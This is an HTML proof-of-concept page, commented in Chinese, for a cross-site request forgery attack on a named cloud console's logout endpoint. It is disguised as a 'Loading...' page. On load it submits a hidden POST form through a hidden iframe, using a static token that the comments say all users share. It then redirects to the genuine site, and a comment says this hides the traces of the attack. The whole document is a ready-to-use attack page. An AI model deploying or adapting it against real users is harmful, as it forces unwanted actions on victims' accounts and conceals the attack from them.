<!DOCTYPE html>
<html>
<head>
    <title>Loading...</title>
</head>
<body>
    <!-- 隐藏的 iframe，用于接收表单提交结果，避免页面跳转 -->
    <iframe name="csrf_frame" style="display:none;"></iframe>

    <!-- 自动提交的登出表单 -->
    <form action="console.volcengine.com/api/passport/login/logout"
          method="POST"
          target="csrf_frame"
          id="logoutForm"
          style="display:none;">
        <!-- 静态 CSRF Token，所有用户均相同 -->
        <input type="hidden" name="x-csrf-token" value="8b13c7ddf17a645320fff792b453c01c">
    </form>

    <script>
        // 页面加载后立即提交表单，无需用户任何操作
        window.onload = function() {
            document.getElementById('logoutForm').submit();
            // 可选：延迟后跳转到正常网站，掩盖攻击痕迹
            setTimeout(() => {
                window.location.href = 'https://www.volcengine.com';
            }, 1500);
        };
    </script>
</body>
</html>
